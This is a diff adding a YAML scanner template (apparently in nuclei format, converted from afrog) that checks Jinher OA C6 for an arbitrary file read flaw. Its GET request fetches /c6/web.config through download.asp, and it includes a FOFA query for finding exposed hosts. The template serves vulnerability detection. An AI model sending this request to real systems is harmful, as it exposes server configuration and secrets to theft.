@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - <configuration>
+          - <configSections>
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config'
+id: jinher-oa-c6-download-file-read
+info:
+  author: zan8in
+  description: |-
+    金和OA C6 download.jsp文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息
+    fofa: app="金和网络-金和OA"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 金和OA C6 download.jsp 任意文件读取漏洞
+  severity: high
+  tags: jinher,oa,fileread,argus-import
